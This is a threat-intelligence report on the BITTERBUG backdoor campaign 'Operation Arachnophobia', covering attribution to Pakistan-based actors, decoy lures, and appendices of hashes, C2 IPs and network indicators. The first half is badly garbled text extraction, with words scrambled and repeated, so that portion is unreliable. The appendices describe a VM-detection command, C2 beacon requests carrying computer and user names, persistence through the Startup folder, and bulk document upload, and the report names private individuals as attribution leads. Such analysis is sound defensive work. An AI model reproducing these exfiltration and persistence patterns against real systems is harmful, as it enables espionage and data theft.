in     P akistan )

the August
“ Cath ”
aand

2013
files
re
aTCIRT
sn
Indian
Gpost .
overnment

blogcomponents

upport
pension

These BITTERBUG
and
m   emorandum .

variants          As
stated

werevprobably
not
BITTERBUG
so
it
inin

used
ariants ,
pthe

s
attacks    around summer
robable

original

2013 , using possible       blog

lures     w(ere

and

related
that
these
raised
in
tbhe

dtoeveloped

the then - recent     y
afnother

ormal

death of Tpranchulas

“ Sarabjit          response ) ,

arty
but
Singh ”
are
a
( an Indianseveral

national
required
bimprisoned
inaries

component
in Pakistan ) and an
of
the

contain

family .

Indian Government pensionreferences

memorandum.to
“ Cath ”
in
the

As stated        in thedebug
path .

original   blog    It
( and
is
important

raised in theto
formal
note
Tranchulas
that
the
response ) , several
“ Cath ”

binaries contain                files
toare


references          “ Cath ” support

in thecdebug
omponents

path . It aisnd
not
BITTERBUG

important          to note that vthe       ariants ,

“ Cath”sfiles
o
it
are
is
psupport
robable

components and
that
t hese
w
notC:\Users\Tranchulas\Documents\Visual ere
d   eveloped

BITTERBUG variants , so it is probable that these were        b y
a nother

Studio   p arty

developed    b ut

by another party but are a requiredf
component
a re
a
r equired

2008\Projects\upload\Release\upload.pdb   c omponent
o   the
of
the family .
family .

C:\Users\Cath\documents\visual                                studio 2010\Projects\ExtractPDF\Release\ExtractPDF.pdb

C:\Users\Cath\documents\visual

studio 2010\Projects\Start\Release\Start.pdb

C:\Users\Tranchulas\Documents\Visual

Studio 2008\Projects\upload\Release\upload.pdb

C:\Users\Cath\documents\visual         studiow2010\Projects\ExtractPDF\Release\ExtractPDF.pdb
Additional
BITTERBUG
variants
ere
compiled
in
June
and
July
2013
that
contained


C:\Users\Cath\documents\visual studio 2010\Projects\Start\Release\Start.pdb

different
identifiers
in
the
debug
paths :
“ Cert - India ”
( 3
samples )
and


“ umairaziz27 ”
( 1
sample).41
The
presence
of
“ umairaziz27 ”
in
a
debug
path

Additional BITTERBUG
Additional

from
one
variants        sBample
ITTERBUG
were                 mcompiled        akes
variants
us
w                   inonder
June            and
were
if
ctJuly       r2013
ompiled

his
that
epresents
contained
in
June
and

an
Jdifferent
uly
2013

operational
identifiers
stecurity
in the debug paths :
hat
contained

“ Cert - India ”      different

mistake .
( 3 samples )                                                iT    dentifiers

he
and           debug
“ umairaziz27 ”                   in
path
the
odf
ebug
“ umairaziz27 ”
( 1 p   aths :
“ Cert - India ”

sample ) .                41
led
us
to
ofT(“umairaziz27 ”
The presence                               3
samples )

witter               42
and
aLnd
in a debug
inkedIn            43
path from one
sample makes“umairaziz27 ”
us wonder(ifon

accounts
thiswrepresents                hich
( 1
saample ) .
matching
an operational                   41
Tahe

lias
presence

isecurity
s
used )
mistake .    “ umairaziz27 ”

otf
hat
The debug
belong
to
a
path
Tranchulas
in

of a“umairaziz27 ”

debug
path
led us to Twitter42
employee

and LinkedIn43from
accounts
named
one
U(on       smair

ample
which             Aziz ,
ma akes
who
uis

matching                                                      walias
dentified
onder
is used ) hif
imself

this

thatrepresents

belong
as
an
Ito           a aTranchulas
n
operational

nformation
employee
Security
security

Anamed
nalystUmair     44
and
Aziz , who
mistake .

identified himself       graduate
as an Information                             The
of
Ndational
ebug
Security        path
University
oAnalyst   f
“ umairaziz27 ”
44oand
f
Sciences

graduateaof           lnd

ed
Tuechnology
National s
to
TUniversity
witter
( of     45   42
and

NUST ) .    SciencesLinkedIn
46
Oand      43
f

these
45 ( NUST).46
ne
oTechnology
accounts

One of these samples     samples
was            ( won
as

probably        wphich
robably
used   a
matching
uinsed
attacks                  in
attacks
lias

in late      is
summer
uin

sed )

late
t2013 ,
hat

summer
belong

using2013 ,
ato
a
uTsing

“ leaked        ranchulas

report ”              lureemployee

a
“ leaked
report ”

which              contained a decoy
named

lure
w
document related to Pakistan ’s alleged inability to locate Osama Bin Laden .
U
hich
mair
c                A
ontained
ziz ,
w               ho
a
i
d     dentified

ecoy
d           h     imself

ocument
r   a s
a
elated
n
I nformation

t   o
P akistan ’s
S ecurity

a      lleged
A i   nalyst
nability
44 t
ao
nd

graduate

locate
Osama
of
National
Bin
Laden .
University
of
Sciences
and
Technology45
( NUST).46
One
of
these

samples


w              as
p          robably
used
in
attacks
in
late
summer
2013 ,
using
a
“ leaked
report ”

lure
which
contained
a
decoy
document

C:\Users\Cert - India\Documents\Visual                                                                                                                                                                                                                                                       related
2008\Projects\ufile\Release\ufile.pdb
Studio                   to
Pakistan ’s
alleged
inability
to


locate
Osama
Bin
Laden .

C:\Users\umairaziz27\Documents\Visual                                                                                                                                                                                                                                                       Studio 2008\Projects\usb\Release\usb.pdb





C:\Users\Cert - India\Documents\Visual
After publication        After
of thepTCIRT                                   ublication
blog and                               of
tour                  he
communications     TCIRT
blog
and
Studio
with      Tranchulas
our
2008\Projects\ufile\Release\ufile.pdb
communications
occurred in August             with
T2013 ,          ranchulas
no new samples of

C:\Users\umairaziz27\Documents\Visual Studio 2008\Projects\usb\Release\usb.pdb

BITTERBUG oroccurred
its supporticomponents                                                         n
August
2013 ,
( basednon                                         o
ncompile          ew
samples
times ) were              identified untiloSeptember
of
BITTERBUG
r
its
support
( various           support components ) and
components

October ( a new
( based
BITTERBUG                                             on
compile
variant ) . Interestingly ,                               times )
were
theidentified

samples compiled            until
Sfollowing
eptember
the(blog      various
publication     support
used entirely new and generic
After

debug paths ( Figure      components )
p
11 )        ublication
as well a                                       asnd
aof
Otctober

compilation      he
TCIRT
( a
tactic   nbew
log

toBaconceal
nd
our
the
ITTERBUG
communications

C2variant ) .

address from                          with
analysis .
Interestingly ,

static               Tranchulas
the
samples

Between               September and
occurred

compiled
i     n

f          A
ollowing

December , we observed more variations of BITTERBUG and its support components in terms of packaging , host - based
ugust
2         t   013 ,

he
b            n
log
o
n    p   ew
s amples

ublication
u   o f

sed
B ITTERBUG

e   ntirely
n    ew
o    r

a     i ts

nd
s g   upport

eneric
c
d     omponents

ebug
paths
activities ,
( based

( Figure
on
11 )
compile
as
well
times )
as
a
compilation
were
identified
tactic
until
September

to
conceal
the
C(2
various

address
support

from
static

components )

analysis .
Between
and
OSctober
eptember
( a
new
and
BDITTERBUG

ecember ,
w               variant ) .

e
observed
Interestingly ,

more
variations
the
samples

of

40 	       http://curl.haxx.se/libcurl/
compiled



















f
ollowing



















t

he






b


log








p

ublication
used
entirely
new
and
generic
debug
paths

41 	       Appendix A : Malware Details
( Figure

41
Appendix
11 )
Aa :
s
Mwalware
ell
as
Daetails
compilation

tactic
to
conceal
the
C2
address
from
static

42 	       https://twitter.com/umairaziz27
analysis .

42
https://twitter.com/umairaziz27                                Between
September
a
nd
December ,
we
observed
more
variations
of

43 	       http://pk.linkedin.com/in/umairaziz27


43





h

ttp://pk.linkedin.com / in / umairaziz27


















































44 	       https://twitter.com/umairaziz27/status/332049978878996481

A
hppendix
A :
Malware
Details

41      44                             ttps://twitter.com / umairaziz27/status/332049978878996481

45 	 www.nust.edu.pk
42      45
h
w                 ww.nust.edu.pk

ttps://twitter.com / umairaziz27

46 	       http://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Profile%20SEECS%20%20BICSE.pdf
43      46                      ttp://pk.linkedin.com / in / umairaziz27


hhttp://www.nust.edu.pk / INSTITUTIONS / Directortes / ilo / Download%20Section / Graduate%20Pro
44      file%20SEECS%20%20BICSE.pdf

https://twitter.com/umairaziz27/status/332049978878996481


45
www.nust.edu.pk

46http://www.nust.edu.pk / INSTITUTIONS / Directortes / ilo / Download%20Section / Graduate%20Pro


12

9               •              OPERATION     ARACHNOPHOBIA
file%20SEECS%20%20BICSE.pdf
BITTERBUG
and
its
support
components
in
terms
of
packaging ,
host-­‐based

activities ,
and
decoys
( or
the
lack
of
them )
compared
to
the
samples
before
our
blog

and decoys ( or thepost .

lack T
ofhis

them )   could

comparedindicate

to the   that

samplesthe
threat

before aour
ctors

blogwpost .
ere
aThisware

could of
indicate
the
blog

that post
and
actors were aware
the threat
modified
t     heir
m alware
a nd
r elated
c omponents
t o

of the blog post and modified their malware and related components to distance them from prior indicators . d istance
t     hem
f rom
p rior

indicators .




C:\Intel\Logs\file.pdb

Figure
11 :
Generic
Debug
Path


Figure 11 : Generic Debug Path
Between
December
2013
and
late
March
2014 ,
we
observed
several
new
lures
used

in
BITTERBUG
self-­‐extracting
RAR
( SFXRAR )
files .
One
from
December
contained

Between December 2013 and late March 2014 , we observed several new lures used in BITTERBUG self - extracting RAR ( SFXRAR )
several
BITTERBUG
variants
and
used
a
decoy
PDF
document
( Figure
12 )
related
to

files . One from December         contained
the
December
several
arrest
of
BITTERBUG         variants and used
Devyani
Khobragade ,               47
an
aIndian

decoy PDF           document
diplomat
( Figure
in
the
12 ) related to the
United

December arrest States .

of DevyaniIn
spring
2014 ,
we
observed
a
SFXRAR
file
with
a
filename
lure
related
to
athe

Khobragade ,        47
an Indian    diplomat       in    the United       States .     In    spring        2014 ,       we        observed        SFXRAR file
with a filename lure     related
March
to thedisappearance

2014
March 2014 disappearance
of
Malaysia
of A
Malaysia
irlines
Airlines
Flight
Flight
370 370 48            ( cast

( cast

48
as
aas
Paakistan-­‐
Pakistan - related hijacking ) .
related

This SFXRAR contained            hijacking ) .

the    latest BITTERBUG This
SFXRAR

variant , c    ontained

which      had new   the
dependencies
latest
BITTERBUG

on support     variant ,

components .      which
Interestingly ,
had
this
new
d ependencies
o n
s upport
c omponents .
I nterestingly ,

SFXRAR ’s filename was the only lure element related to the MH370 event ; it did not contain a decoy document . We provide a    t his
S FXRAR ’s
f ilename

was

more detailed report      onthe

thisoSFX
nly
land
ure
the
element

related rvariant
elated
intAppendix
o
the
MH370

A : Malwareevent ;
it
did
not
contain
a
decoy

Details .
document .
We
provide
a
more
detailed
report
on
this
SFX
and
the
related
variant
in

Appendix
A :
Malware
Details .






























































Figure 12 : Screenshot of Indian diplomat arrest decoy PDF
47
http://world.time.com/2013/12/18/us-to-review-devyani-khobragade-arrest-and-strip-search/

48http://www.businessinsider.com / mh370-investigators - find - evidence - of - a - mysterious - power-
outage - during - the - early - part - of - its - flight-2014 - 6

BITTERBUG continued to rely on the same network behaviors to communicate with its C2s . Connections to its C2 nodes relied on
PHP and used communications that included “ .php?compname= ” and “ .php?srs= ” , as well as direct file / component retrieval

13
also
from the C2s . Though many of the samples that we have observed use direct IPs for HTTP communications , we have
observed more limited use of a No - IP domain .
47 	          http://world.time.com/2013/12/18/us-to-review-devyani-khobragade-arrest-and-strip-search/
48 	          http://www.businessinsider.com/mh370-investigators-find-evidence-of-a-mysterious-power-outage-during-the-early-part-of-its-flight-2014-6
10       •       OPERATION ARACHNOPHOBIA
Conclusion
Operation Arachnophobia consists of an apparent targeted exploitation campaign , dating back to early 2013 , using the
BITTERBUG malware family and seemingly directed against entities involved in India - Pakistan issues . The threat actor appears to
have exclusively used VPSNOC , a probable Pakistan - based VPS service provider who leased U.S. hosting services , for both the
delivery and C2 phases of attack . Research later identified that a Pakistan - based VPSNOC representative had a social network
affiliation with a Tranchulas employee as well as apparent affiliations with the Anonymous and AntiSec movements .
After the August 6 , 2013 blog , Tranchulas provided TCIRT and the media an official statement and explanation of BITTERBUG
activity , however , this explanation contained discrepancies . The TCIRT addressed some of these discrepancies with Tranchulas
personnel , who were unresponsive , increasing our suspicion of the activity . We later observed BITTERBUG activity following
August 2013 with subtle changes that further generalized debug paths . It was this chain of events that served as a catalyst for
extra scrutiny of the activity and collaboration between the ThreatConnect and FireEye Labs teams to share information .
While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity , we can confidently point
to many characteristics of a Pakistan - based cyber exploitation effort that is probably directed against Indian targets or those who
are involved in India - Pakistan issues . Many of the notable characteristics of the BITTERBUG activity suggest that this is indeed
part of a Pakistan - based cyber exploitation effort that has apparently attempted to obfuscate its malware characteristics and
origins ( behind U.S. infrastructure ) , before and after public disclosure in August 2013 .
On the surface , BITTERBUG serves as an example of how threat actors mask their operations across social , cultural and
geographic boundaries . More importantly , it demonstrates the value of threat intelligence sharing and industry collaboration . As
one organization begins to pull at a thread of evidence and share their findings with another , a larger understanding and shared
perspective is revealed . It is through this process that a shared awareness emerges into a larger , more comprehensive story that
explains what we are seeing and why - ultimately it is this story that better serves us all .
11    •    OPERATION ARACHNOPHOBIA
APPENDIX
APPENDIX A : Malware Details
BITTERBUG
BITTERBUG is a backdoor executable capable of uploading and downloading files , listing running processes , generating file listings ,
and automatically transferring selected files to its command and control ( C2 ) server . BITTERBUG appears to be virtual machine aware
and may not execute on a VMWare or VirtualBox VM . We have observed BITTERBUG installed by a self - extracting RAR archive
disguised as a screensaver . Upon execution , the self - extracting RAR archive may extract configuration files , dependency DLLs , and
the BITTERBUG executable . The timeline below is of BITTERBUG activity from May 2013 through March 2014 .
Timeline of BITTERBUG characteristics vs . ThreatConnect events
12    •    OPERATION ARACHNOPHOBIA
Details
Upon execution the self - extracting RAR may install < BITTERBUG>.exe and the following DLLs :
• 	  libcurld.dll – Used for downloading and uploading files
• 	  msvcm90d.dll – C runtime library
• 	  msvcp90d.dll – C runtime library
• 	  msvcr90d.dll – C runtime library
The self - extracting RAR may install the following benign configuration files :
• 	  Microsoft . VC90.DebugCRT.manifest – Compilation artifact
• 	  BtcirEt . DZU – Self - extracting RAR configuration file
• 	  SJeXSrA.KNX – Self - extracting RAR configuration file
• 	  VCAKSQl . TNT – Self - extracting RAR configuration file
BITTERBUG first may execute the following Windows Management Instrumentation ( WMI ) command to detect the presence of a
virtual machine ( VM ) :
• 	  cmd.exe /c wmic diskdrive list brief >
“ % APPDATA%\Microsoft\recovery.txt ”
BITTERBUG then may open recovery.txt and check for the presence of strings VBox or VMware . The backdoor then may
enter an infinite sleep loop if recovery.txt contains either one of the aforementioned strings ( Example in Figure 13 ) .
Figure 13 : Example recovery.txt file from VMware virtual machine
Next BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised
system . An example beacon request is shown in Figure 14 .
POST /path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME% > HTTP/1.1
Host : < c2_location >
Accept : * / *
Content - Length : 25
Content - Type : application / x - www - form - urlencoded
< % COMPUTERNAME%>_<%USERNAME% >
Figure 14 : Initial C2 beacon
13    •     OPERATION ARACHNOPHOBIA
BITTERBUG then may perform an HTTP GET request for the following URI :
http://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME% >
If the C2 server responds with a filename , the filename received is deleted from % APPDATA%\Microsoft < FILE_NAME_FROM _
C2>. The purpose of this command might be to delete older versions of BITTERBUG , although we have not observed this
command occurring in the wild .
BITTERBUG then may attempt to download the files listed in Table 1 . The purpose of the first three files is unknown . The final two
files are downloaded to the user ’s Startup directory and executed at startup in order to maintain persistence .
Request URI                                                     Download Path
http://<c2_location>/versionchk.php?srs=436712384                             % APPDATA%\Microsoft\file.exe
http://<c2_location>/vtris.php?srs=436712384                          % APPDATA%\Microsoft\percf001.dat
http://<c2_location>/vtris1.php?srs=436712384                          % APPDATA%\Microsoft\percf002.dat
http://<c2_location>/is_array_max.php?compname=                          % USERPROFILE%\Start Menu\Programs\
< % COMPUTERNAME%>_<%USERNAME% >                                                 Startup\wincheck.exe
http://<c2_location>/is_array_pal.php?compname=                       % USERPROFILE%\Start Menu\Programs\
< % COMPUTERNAME%>_<%USERNAME% >                                                  Startup\winsquirt.exe
Table 1 : Files downloaded by the backdoor
Next , BITTERBUG may scan through each drive letter and search recursively for files with the following file extensions : .doc ,
.ppt , .xls , .pdf , .docx , .pptx , .pps , .xlsx
BITTERBUG then typically creates a file list containing all documents ( excluding those whose filename contains MediaUtils ) to
the following locations :
• 	  % APPDATA%\Microsoft\plang006.txt
• 	  % APPDATA%\Microsoft\tlang006.txt
BITTERBUG may also write a list of all running processes to :
• 	  % APPDATA%\Microsoft\prc.dat
Finally , BITTERBUG typically uploads the running process list , document file list , and all documents to the following URI :
• 	  http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME% >
Host - Based Signatures
File System Residue
BITTERBUG may be extracted along with the following embedded files :
• 	  % USERPROFILE%\5rv3fgk6\<BITTERBUG>.exe
• 	  % USERPROFILE%\5rv3fgk6\libcurld.dll
• 	  % USERPROFILE%\5rv3fgk6\msvcm90d.dll
• 	  % USERPROFILE%\5rv3fgk6\msvcp90d.dll
• 	  % USERPROFILE%\5rv3fgk6\msvcr90d.dll
• 	  % USERPROFILE%\5rv3fgk6\Microsoft . VC90.DebugCRT.manifest
14    •      OPERATION ARACHNOPHOBIA
• 	  % USERPROFILE%\5rv3fgk6\SJeXSrA.KNX
• 	  % USERPROFILE%\5rv3fgk6\BtcirEt . DZU
• 	  % USERPROFILE%\5rv3fgk6\VCAKSQl . TNT
The malware may create the following files :
• 	  % APPDATA%\Microsoft\recovery.txt
• 	  % APPDATA%\Microsoft\plang006.txt
• 	  % APPDATA%\Microsoft\tlang006.txt
• 	  % APPDATA%\Microsoft\prc.dat
• 	  % APPDATA%\Microsoft\file.exe
• 	  % APPDATA%\Microsoft\percf001.dat
• 	  % APPDATA%\Microsoft\percf002.dat
• 	  % USERPROFILE%\Start Menu\Programs\Startupwincheck.exe
• 	  % USERPROFILE%\Start Menu\Programs\Startup\winsquirt.exe
Network - Based Signatures
• 	  The malware typically communicates on TCP port 80 :
• 	  The malware may perform HTTP requests for the following URIs :
• 	  http://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME% >
• 	  http://<c2_location>/is_array_max.php?compname=<%COMPUTERNAME%>_<%USERNAME% >
• 	  http://<c2_location>/is_array_pal.php?compname=<%COMPUTERNAME%>_<%USERNAME% >
• 	  http://<c2_location>/path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME% >
• 	  http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME% >
• 	  http://<c2_location>/versionchk.php?srs=436712384
• 	  http://<c2_location>/vtris.php?srs=436712384
• 	  http://<c2_location>/vtris1.php?srs=436712384
File Manipulations
We observed other interesting operational security - oriented challenges in the post - blog post samples . In one case , an actor
appeared to manually null out the “ Cert - India ” user directory in one of the file paths ( see figures 15 and 16 below ) contained in
two binaries ( support components ) . These files shared the same import hash ( 4e96e86db5a8a025b996aefdc218ff74 ) and were
virtually the same files minus modification to a few bytes in the second sample .
Figure 15 : Original file content for 7588ff900e32145cbcbc77837237aef8
15    •     OPERATION ARACHNOPHOBIA
Figure 16 : Nulled file path for 26616e6662b390ebdb588cdaaae5e4f6
As these samples point to , we also observed use of the C++ Boost libraries , which introduced a new file path to monitor for
operational security purposes . We observed at least one case in which files mixed old and new file paths , as seen in the figures 17
and 18 below .


Figures
17
and
18 :
Screenshots
from
two
locations
in

Figures 17 and 18 : Screenshots from                 6e8c4d2d5d4e5e7853a1842b04a6bfdf

two locations in 6e8c4d2d5d4e5e7853a1842b04a6bfdf


In
both
cases ,
it
is
possible
that
the
actors
intentionally
did
this
in
an
attempt
to

In both cases , it is possible    that the
mislead
actors intentionally
further
research
edid         this iin
fforts
an pattempt
nto
to mislead
ost-­‐blog
samples
further    research
or
cast
efforts o
suspicion
inton
“ post-
Cert-­‐
India ”
on
blog samples or cast suspicion        as
“ Cert - India ”
a
more-­‐revealing
element .
Felement .
as a more - revealing              or
example ,
analysis

For example ,            of
files

analysis             deployed

of files    deployed alongside
alongside

the nulled - out “ Cert - India ”                  the
nulled-­‐out

sample mentioned                            “ Cert-­‐India ”

above revealed           a lack of sample

concern       mover
entioned
above

the same      string . revealed

Alternatively , a
lack

these of

concern
o   ver
t he
s ame

inconsistencies could also indicate sloppy tradecraft and/or teamwork . s tring .
A lternatively ,
t hese
i nconsistencies
c ould
a lso
i ndicate

sloppy
tradecraft
and/or
teamwork .



C:\Users\Cert-
India\Documents\boost_1_53_0\boost / thread / win32/thread_primitives.hpp








16       •      OPERATION ARACHNOPHOBIA
APPENDIX B : MD5 Hashes and Malware Table
BITTERBUG Hashes
MD5                                   File Size ( bytes )                 Compile Time
be7de2f0cf48294400c714c9e28ecdd1                          158720                   2013 - 05 - 08T10:58:22Z
fd3a713ebf60150b99fb09de09997a24                          158208                   2013 - 05 - 10T19:18:54Z
03f528e752dee57b1ff050a72d30de60                          158208                   2013 - 05 - 23T17:21:19Z
801c8bac8aea4d0226e47551c808a331                          169984                   2013 - 06 - 14T13:53:13Z
a21f2cb65a3467925c1615794cce7581                          172032                   2013 - 06 - 25T13:04:04Z
35663e66d02e889d35aa5608c61795eb                          171520                   2013 - 07 - 09T10:16:00Z
328adb01fb4450989ee192107a765792                          173056                   2013 - 08 - 01T17:28:54Z
8878162cf508266f6be1326da20171df                          267776                   2013 - 10 - 24T09:28:23Z
5ccb43583858c1c6f41464ee21a192ba                          225792                   2013 - 12 - 06T10:02:36Z
44abc22162c50fcc8dc8618241e3cd1a                          169472                   2013 - 12 - 26T09:19:40Z
6e8c4d2d5d4e5e7853a1842b04a6bfdf                          480256                   2013 - 12 - 30T13:11:23Z
828d4a66487d25b413cb19ef8ee7c783                          171520                   2014 - 03 - 17T08:16:25Z
BITTERBUG and Support Component Debug Strings ( in order of first use )
Compile Time             Debug Paths
2013 - 05 - 08T10:58:22Z     C:\Users\Tranchulas\Documents\Visual Studio 2008\Projects\upload\Release\upload.pdb
2013 - 05 - 10T19:18:54Z     C:\Users\Tranchulas\Documents\Visual Studio 2008\Projects\upload\Release\upload.pdb
2013 - 05 - 23T17:21:19Z     C:\Users\Tranchulas\Documents\Visual Studio 2008\Projects\upload\Release\upload.pdb
2013 - 05 - 28T11:59:36Z     C:\Users\Cath\documents\visual studio 2010\Projects\ExtractPDF\Release\ExtractPDF.pdb
2013 - 05 - 30T08:48:04Z     C:\Users\Cath\documents\visual studio 2010\Projects\Start\Release\Start.pdb
2013 - 06 - 13T08:34:21Z     C:\Users\Cath\documents\visual studio 2010\Projects\ExtractPDF\Release\ExtractPDF.pdb
2013 - 06 - 14T13:53:13Z     C:\Users\Cert - India\Documents\Visual Studio 2008\Projects\ufile\Release\ufile.pdb
2013 - 06 - 25T13:04:04Z     C:\Users\umairaziz27\Documents\Visual Studio 2008\Projects\usb\Release\usb.pdb
2013 - 07 - 09T10:16:00Z     C:\Users\Cert - India\Documents\Visual Studio 2008\Projects\ufile\Release\ufile.pdb
2013 - 08 - 01T17:28:54Z     C:\Users\Cert - India\Documents\Visual Studio 2008\Projects\ufile\Release\ufile.pdb
2013 - 10 - 24T09:28:23Z     C:\Intel\Logs\file.pdb
2013 - 12 - 06T10:02:36Z     C:\Intel\Logs\logs.pdb
2013 - 12 - 26T09:19:40Z     C:\Intel\Logs\file.pdb
2013 - 12 - 30T13:11:23Z     C:\Intel\Logs\file.pdb
2014 - 03 - 17T08:16:25Z     C:\Intel\Logs\file.pdb
17    •    OPERATION ARACHNOPHOBIA
BITTERBUG Import Hashes
Imphash                    Compile Time
610893cd57631d1708d5efbc786bd9df     2013 - 05 - 08T10:58:22Z
5b1bebadb5713018492b1973ab883c25     2013 - 05 - 10T19:18:54Z
5b1bebadb5713018492b1973ab883c25     2013 - 05 - 23T17:21:19Z
cf63bfee568869182bd91a3cb8e386ce     2013 - 06 - 14T13:53:13Z
ccca290b8ab75a5b29f61847fb882c20     2013 - 06 - 25T13:04:04Z
cf63bfee568869182bd91a3cb8e386ce     2013 - 07 - 09T10:16:00Z
435bd4f04b2ee7cb05ce402f2bcea85e     2013 - 08 - 01T17:28:54Z
2458ee58d046f14cad685e6c9c66f109     2013 - 10 - 24T09:28:23Z
c47d4980c1c152eba335bed5076e8a6f     2013 - 12 - 06T10:02:36Z
bd0665ffedcf2a9ded36a279d08e4752     2013 - 12 - 26T09:19:40Z
58758cb068583736ef33a09a2c4665de     2013 - 12 - 30T13:11:23Z
5b943bec7d2a589adfe0d3ff2a30bfe5    2014 - 03 - 17T08:16:25Z
18    •    OPERATION ARACHNOPHOBIA
BITTERBUG Network Communications
HTTP Requests
http://<c2_location>/checkpkg_maxell.php?compname=
http://<c2_location>/checkpkg_petal.php?compname=
http://<c2_location>/checkpkg.php?compname=
http://<c2_location>/fetch_updates_8765_tb.php?compname=
http://<c2_location>/fetch_updates_flex.php?compname=
http://<c2_location>/fetch_updates_m.php?compname=
http://<c2_location>/fetch_updates_petal.php?compname=
http://<c2_location>/fetch_updates_pops.php?compname=
http://<c2_location>/fetch_updates_pret.php?compname=
http://<c2_location>/is_array_max.php?compname=
http://<c2_location>/is_array_own.php?compname=
http://<c2_location>/is_array_pal.php?compname=
http://<c2_location>/is_array.php?compname=
http://<c2_location>/maxell_active.php?compname=
http://<c2_location>/path_active.php?compname=
http://<c2_location>/petal_active.php?compname=
http://<c2_location>/version_maxell.php?srs=
http://<c2_location>/version_own.php?srs=
http://<c2_location>/version_petal.php?srs=
http://<c2_location>/versionchk.php?srs=
http://<c2_location>/vtris.php?srs=
http://<c2_location>/vtris1.php?srs=
http://<c2_location>/fetch_updates_8765.php?compname=
BITTERBUG Domain & IPs
C2s
199.91.173.43
199.91.173.44
199.91.173.45
windowsupdate.no-ip.biz
19    •    OPERATION ARACHNOPHOBIA
APPENDIX C : VPSNOC Email Header Analysis
The Kansas - City - based hosting provider sent an introductory email message on July 24th , 2013 at 1500 CDT and would be
received by TCIRT at 1400 EDT and VPSNOC on Thursday July 25th , 2013 at 1200 PKT . 49
Analysis of the VPSNOC email50 header indicated that the message was sent on Thursday 25 July at 02:28:41 + 0500 GMT , which
is consistent with Pakistan ’s time zone . Of note , the email message was sent with an X - Originating IP Address of 184.75.214.10
corresponding to a Private Internet Access51 Canadian proxy52 . VPSNOC ’s use of this commercial proxy service likely
demonstrates the intent to mask the apparent origin of the sender .
These two examples highlight that VPSNOC ’s inbound and outbound email communications consistently utilized a + 0500
Pakistani timezone .
49 	        Digital Appendix 1 : Raw Email Communications ; Email#1 Subject- Re- Contact Info ( Date- We d , 24 Jul 2013 14 - 00 - 29 -0500).eml
50 	        Digital Appendix 2 : Raw Email Communications ; Email#2 Subject- Re- Contact Info ( Date- Thu , 25 Jul 2013 02 - 28 - 41 + 0500).eml
51 	        https://www.privateinternetaccess.com
52 	        http://pastebin.com/F261NfYa
20     •      OPERATION ARACHNOPHOBIA
APPENDIX D : Inconsistencies Observed
Due to the apparent Pakistani nexus within the BITTERBUG malware and the Pakistan time zone consistently observed within
the VPSNOC emails , the TCIRT applied additional scrutiny and research of the content within the Tranchulas “ Response _
ThreatConnect.docx ” to validate their claims . In the following section we will examine the inconsistencies observed . Within the
response we observed the following inconsistencies :
Inconsistency # 1 : Day & Date Misalignment within image1.png Screenshot
Our review of the “ Response_ThreatConnect.docx”53 focused in on the email screenshot ( Figure 3 ) image1.png54 that Khan
provided revealing that the date probably had been modified to appear as though they were the first to notify VPSNOC . Within
the official response , Zubair Khan indicated that Tranchulas was “ already aware of this incident ... and contacted hosting
company . ” The official response included a screenshot depicting an email sent to VPSNOC from an unidentified ( redacted )
tranchulas.com email address that was sent on “ Tue , Jul 21 , 2013 at 11:36 PM ” with no evidence of the date in which it was
received by or responded to by VPSNOC . This message contained a notable misalignment between the date and day of the week .
July 21 , 2013 was a Sunday , not a Tuesday . “ Tuesday ” would have pre - dated our official notification that occurred on Wednesday
July 24 , 2013 , and could indicate that Tranchulas may have obtained insight into the original TCIRT notification through Pakistan-
based contacts within VPSNOC . The TCIRT subsequently responded to Mr. Khan ’s official explanation with a follow - up inquiry ,
offering Khan an opportunity to explain the date inconsistency within the email screenshot . Mr. Khan deferred our request to
Mr. Hamza Qamar55 , a Penetration Testing Team Lead at Tranchulas , who later responded56 with a simple denial that the email
message had not been altered apart from blurring the name of the original sender .
Inconsistency # 2 : Awareness of Withheld Information
The email screenshot ( image1.png ) from within the Tranchulas response demonstrated awareness of information that we initially
withheld and later released in our blog post : one malware variant57 that contained a debug string with “ umairaziz27 ” the
same username as a Tranchulas employee . The Tranchulas message to VPSNOC incorrectly claimed to identify malware on
199.91.173.43 that contained the “ company ’s name and ... employee ’s name ” . While it is possible that Tranchulas’ analysts
discovered this variant independent of the blog post , it added to the inconsistent elements of the response and further suggested
that the blog post may have inspired its communications with VPSNOC . We note that we requested additional information such as
the “ detailed analysis report ” within the exchange from Tranchulas but did not receive a response .
Inconsistency # 3 : Tranchulas Direct Notification
The Tranchulas response indicates that “ Tranchulas’ research team was already aware of this incident before publication
of this report . Our team contacted hosting company of server to seek an explanation . ” Considering there are no
public references to the identified infrastructure identifying VPSNOC as the “ hosting company ” . The only way for Tranchulas to
identify VPSNOC as the hosting company was to either have previous insider knowledge of the activity , or to have been privately
introduced by the Kansas - City - based service provider to their “ client ” VPSNOC , of which was never mentioned or discussed when
we initially exchanged with either the Kansas - City or Pakistan - based hosting providers .
53 	        Digital Appendix 1 : Research Collateral Response_ThreatConnect.docx ( MD5 : 6f7010a28f33be02d85deb9ba40ec222 )
54 	        Digital Appendix 1 : Research Collateral image1.png ( MD5 : d224f39f8e20961b776c238731821d16 )
55 	        http://pk.linkedin.com/pub/hamza-qamar/22/6b8/109
56 	 Digital Appendix 2 : Raw Email Communications ( Email#4 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up -
( Date- Thu , 15 Aug 2013 12 - 52 - 54 + 0500).eml
57 	        https://www.virustotal.com/en/file/b9a062e84ab64fc55dedb4ba72f62544eb66d7e1625059d2f149707ecd11f9c0/analysis/
21     •      OPERATION ARACHNOPHOBIA
Public registration of the 199.91.173.43 reveals the Kansas - City - based hosting provider as the official registrant and owner
of the infrastructure . The only way to know that VPSNOC was subleasing the infrastructure was to obtain this information directly
from them . There was no public reference which would have revealed VPSNOC as the entity which maintained root access to the
199.91.173.43 . Had Tranchulas legitimately conducted an initial victim notification sometime in late July 2013 , they would have
likely done so through the Kansas - City - based hosting provider and not VPSNOC .
